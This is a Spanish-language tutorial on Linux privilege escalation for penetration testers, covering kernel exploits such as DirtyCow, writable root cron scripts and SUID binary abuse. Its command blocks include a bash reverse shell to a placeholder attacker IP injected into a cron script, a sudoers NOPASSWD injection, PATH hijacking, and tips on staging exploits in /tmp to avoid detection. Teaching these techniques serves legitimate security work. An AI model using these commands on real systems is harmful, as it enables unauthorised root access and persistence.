# Linux Privilege Escalation

La **escalada de privilegios** es el proceso de explotar vulnerabilidades o configuraciones incorrectas para elevar el acceso de un usuario con pocos privilegios a `root`. Es una fase crítica del ciclo de ataque y un determinante clave del éxito de una prueba de penetración.

> ⚠️ **Nota**: Todos los comandos asumen que ya has obtenido **acceso inicial** al sistema Linux objetivo como usuario con pocos privilegios. Reemplaza rutas y valores con los tuyos reales.

---

## El Kernel de Linux

El **kernel** es el núcleo del sistema operativo — tiene control completo sobre cada recurso y componente de hardware del sistema. Actúa como capa de traducción entre hardware y software.

Los exploits de kernel de Linux apuntan a vulnerabilidades en el propio kernel para ejecutar código arbitrario con el nivel de privilegio más alto — `root`. El proceso difiere según:
- La **versión del kernel** y la **distribución** objetivo.
- El **exploit de kernel** específico que se use.

> ⚠️ **Precaución**: Los exploits de kernel pueden causar **crasheos del sistema y pérdida de datos**. Evítalos en entornos de producción/empresa a menos que sea absolutamente necesario.

---

## Metodología de Escalada de Privilegios

```
Obtener Acceso Inicial → Enumerar Sistema → Identificar Vulnerabilidades → Explotar → Shell Root
```

### Paso 1: Enumerar el Sistema

Una vez que tienes una shell con pocos privilegios en el objetivo:

```bash
# Versión del kernel y arquitectura
uname -a
uname -r

# Distribución y versión
cat /etc/issue
cat /etc/*-release

# Usuario actual y privilegios
whoami
id
sudo -l
```

Anota la **versión del kernel**, la **arquitectura** (x86/x64), la **distribución** y la **versión de la distribución** — necesitarás todo esto para encontrar exploits compatibles.

### Paso 2: Verificar Caminos Rápidos Primero

Antes de recurrir a exploits de kernel, siempre comprueba rutas de escalada más simples:

```bash
# Comprobar permisos de sudo — ¿puedes ejecutar algo como root?
sudo -l

# Encontrar binarios SUID propiedad de root
find / -user root -perm -4000 -type f 2>/dev/null

# Comprobar cron jobs con permisos de escritura
cat /etc/crontab
ls -la /etc/cron.*
```

---

## 1. Explotación del Kernel con Linux-Exploit-Suggester

**Linux-Exploit-Suggester** evalúa la exposición del kernel dado frente a todos los exploits de kernel Linux conocidos públicamente. Identifica qué exploits aplican a la versión específica del kernel que corre en el objetivo.

> GitHub: https://github.com/mzet-/linux-exploit-suggester

### Paso 1: Transferir Linux-Exploit-Suggester al Objetivo

En Kali, hospeda el script:

```bash
python3 -m http.server 80
```

En el objetivo, descárgalo:

```bash
wget http://<tu_ip>/linux-exploit-suggester.sh -O /tmp/les.sh
chmod +x /tmp/les.sh
```

### Paso 2: Ejecutar la Herramienta

```bash
/tmp/les.sh
```

La salida lista los exploits de kernel aplicables ordenados por exposición. Anota los **códigos CVE** y nombres de exploits — úsalos para encontrar código de exploit compilado.

### Paso 3: Encontrar y Compilar el Exploit

Ejemplo usando **DirtyCow (CVE-2016-5195)** — uno de los exploits de kernel Linux más famosos, que afecta a kernels 2.6.22 hasta 4.8.3:

```bash
# En Kali — buscar el exploit
searchsploit dirty cow

# Descargar el código fuente del exploit
searchsploit -m 40616   # o el ID de exploit relevante
```

Compilar el exploit en Kali (o en el objetivo si hay un compilador disponible):

```bash
gcc -pthread dirty.c -o dirtycow -lcrypt
```

### Paso 4: Transferir y Ejecutar el Exploit

```bash
# Transferir el exploit compilado al objetivo
wget http://<tu_ip>/dirtycow -O /tmp/dirtycow
chmod +x /tmp/dirtycow

# Ejecutar
/tmp/dirtycow
```

> **Siempre sube los archivos de exploit a `/tmp`** — tiene permisos de escritura para todos los usuarios y es menos probable que sea detectado.

> Exploits de kernel Linux por CVE: https://github.com/SecWiki/linux-kernel-exploits

---

## 2. Explotación de Cron Jobs Mal Configurados

### ¿Qué son los Cron Jobs?

**Cron** es un programador de tareas basado en tiempo en Linux. Ejecuta scripts y comandos automáticamente según un horario definido. Cada tarea programada se llama **Cron job**, y su configuración se almacena en el archivo **crontab**.

**Por qué importan para la escalada de privilegios**: Los Cron jobs configurados para ejecutarse como `root` ejecutan sus scripts con permisos de root. Si un usuario con pocos privilegios puede **editar o reemplazar** el script que se llama, puede inyectar comandos maliciosos que se ejecutan como root.

```
Cron Job de Root → Ejecuta un Script → Script con Permisos de Escritura → Inyectar Comandos → Shell Root
```

### Paso 1: Identificar Cron Jobs de Root

```bash
# Ver el crontab del sistema
cat /etc/crontab

# Comprobar directorios de cron para tareas programadas
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/

# Buscar referencias a archivos específicos que se ejecutan
grep -rnw /usr -e "/home/<usuario>/nombre_archivo"
```

### Paso 2: Comprobar Permisos en el Script

Una vez que encuentras un script que llama un cron job de root:

```bash
ls -al /usr/local/share/copy.sh
```

Busca **permisos de escritura para todos** (`-rwxrwxrwx` o permisos de escritura de grupo). Si cualquier usuario puede escribir en él, puedes inyectar comandos.

### Paso 3: Inyectar un Comando de Escalada de Privilegios

**Método A — Añadirse a sudoers (sudo sin contraseña)**:

```bash
printf '#!/bin/bash\necho "<tu_usuario> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

Espera a que el cron job se ejecute (comprueba el horario en `/etc/crontab`), luego:

```bash
sudo su
```

**Método B — Añadir una reverse shell**:

```bash
printf '#!/bin/bash\nbash -i >& /dev/tcp/<tu_ip>/4444 0>&1' > /usr/local/share/copy.sh
```

Configura un listener en Kali:

```bash
nc -nlvp 4444
```

Espera a que el cron job se active — recibirás una shell root.

### Paso 4: Verificar Acceso Root

```bash
whoami   # Debe devolver: root
id
```

### Resumen de Escalada de Privilegios con Cron Jobs

| Condición | Resultado |
|-----------|-----------|
| Script llamado por cron job root **con permisos de escritura** | Inyectar comandos → ejecutados como root |
| Script **no existe** pero la ruta está en crontab | Crear el script → ejecutado como root |
| Script usa **rutas relativas** (sin ruta completa) | Posible hijacking de PATH |

---

## 3. Explotación de Binarios SUID

### ¿Qué es SUID?

**SUID (Set User ID)** es un permiso especial de archivos Linux. Cuando se establece en un ejecutable, permite que el programa corra con los **permisos del propietario del archivo** en lugar del usuario que lo ejecuta.

En la práctica: si un binario es **propiedad de root** y tiene el **bit SUID establecido**, cualquier usuario que lo ejecute lo corre con **privilegios de root** durante esa ejecución.

```
Usuario Sin Privilegios → Ejecuta Binario SUID → Binario Corre como Root → Escalada de Privilegios
```

SUID es legítimo y necesario para muchos binarios del sistema (ej. `passwd` necesita root para escribir en `/etc/shadow`). La vulnerabilidad surge cuando los binarios SUID están **mal configurados** o **llaman a programas externos** de forma insegura.

### Paso 1: Encontrar Todos los Binarios SUID Propiedad de Root

```bash
find / -user root -perm -4000 -type f 2>/dev/null
```

Desglose de flags:
- `-user root` — propiedad de root
- `-perm -4000` — tiene el bit SUID establecido
- `-type f` — solo archivos regulares
- `2>/dev/null` — suprimir errores de permisos

### Paso 2: Inspeccionar el Binario SUID

Usa `strings` para leer contenido legible del binario — esto revela qué programas o comandos externos llama:

```bash
strings /ruta/al/binario_suid
```

Busca llamadas a **binarios externos sin rutas completas** (ej. `greetings` en lugar de `/usr/bin/greetings`) — estos son explotables mediante hijacking de PATH.

### Paso 3A: Reemplazar el Binario Llamado (Reemplazo Directo)

Si el binario SUID llama a un programa externo (ej. `greetings`) y puedes controlar ese archivo:

```bash
# Eliminar el binario original que se llama
rm /ruta/a/greetings

# Reemplazarlo con una copia de bash
cp /bin/bash /ruta/a/greetings
```

Cuando el binario SUID se ejecute, llamará a tu copia de `bash` en su lugar — ejecutándola como root.

```bash
# Ejecutar el binario SUID
/ruta/a/welcome
# Ahora tienes una shell root
whoami   # root
```

### Paso 3B: Hijacking de PATH

Si el binario SUID llama a un comando externo solo por nombre (sin ruta completa), puedes secuestrar `$PATH` para que ejecute tu versión maliciosa:

```bash
# Crear un script malicioso con el nombre del binario llamado
echo '/bin/bash' > /tmp/greetings
chmod +x /tmp/greetings

# Anteponer /tmp a PATH para que tu versión se encuentre primero
export PATH=/tmp:$PATH

# Ejecutar el binario SUID — encuentra tu versión primero
/ruta/a/welcome
```

### Paso 3C: Explotación de Objeto Compartido Faltante

Si el binario SUID intenta cargar una **librería compartida (.so)** que no existe, puedes crear una maliciosa:

```bash
# Encontrar objetos compartidos faltantes
strace /ruta/al/binario_suid 2>&1 | grep "No such file"

# Crear un objeto compartido malicioso
gcc -shared -fPIC -o /ruta/al/faltante.so exploit.c
```

### Resumen de Métodos de Explotación SUID

| Método | Cuándo Usarlo | Comando |
|--------|--------------|---------|
| **Reemplazo directo** | La ruta del binario llamado tiene permisos de escritura | `cp /bin/bash /ruta/al/binario_llamado` |
| **Hijacking de PATH** | El binario llama a programas sin ruta completa | `export PATH=/tmp:$PATH` |
| **Objeto compartido faltante** | El binario carga un archivo `.so` inexistente | Crear `.so` malicioso en la ruta esperada |

---

## Resumen de Técnicas de Escalada de Privilegios

| Técnica | Herramienta/Método | Requisito | Resultado |
|---------|-------------------|-----------|-----------|
| **Exploit de kernel** | Linux-Exploit-Suggester + binario | Versión de kernel vulnerable | Shell root |
| **Abuso de cron job** | Inspección manual + inyección en script | Script con permisos de escritura llamado por cron root | Shell root |
| **Binario SUID** | `find` + `strings` + reemplazo | Binario SUID con mala configuración | Shell root |
| **Mala configuración de sudo** | `sudo -l` | Comandos sudo permitidos | Shell root |

---

## Puntos Clave

- La **escalada de privilegios** en Linux eleva el acceso de un usuario con pocos privilegios a `root`.
- Siempre **enumera primero**: `uname -a`, `id`, `sudo -l`, comprueba binarios SUID, inspecciona crontab.
- **Comprueba caminos simples antes de exploits de kernel** — sudo mal configurado, binarios SUID y scripts de cron con permisos de escritura son mucho más comunes y estables.
- **Linux-Exploit-Suggester** identifica los exploits de kernel aplicables para la versión específica — transfierelo al objetivo y ejecútalo allí.
- **DirtyCow (CVE-2016-5195)** es uno de los exploits de kernel Linux más conocidos — afecta a kernels 2.6.22 hasta 4.8.3.
- **Siempre sube los archivos de exploit a `/tmp`** — tiene permisos de escritura para todos y está menos monitorizado.
- Los **Cron jobs** que corren como root con scripts con permisos de escritura son una mala configuración crítica — inyecta comandos o una reverse shell en el script.
- Usa `grep -rnw /usr -e "<ruta_script>"` para encontrar qué cron job llama a un script específico.
- Los **binarios SUID** corren con los permisos del propietario — si son propiedad de root y están mal configurados, otorgan acceso root.
- Usa `find / -user root -perm -4000 -type f 2>/dev/null` para encontrar todos los binarios SUID propiedad de root.
- Usa `strings <binario>` para inspeccionar qué programas externos llama un binario SUID — busca llamadas sin rutas completas.
- El **hijacking de PATH** funciona cuando un binario SUID llama a comandos externos sin especificar la ruta completa.
- El **reemplazo directo** funciona cuando el binario externo llamado por SUID está en una ubicación con permisos de escritura — reemplázalo con `/bin/bash`.
- Los exploits de kernel son el **último recurso** — inestables y con riesgo de crashear el sistema.
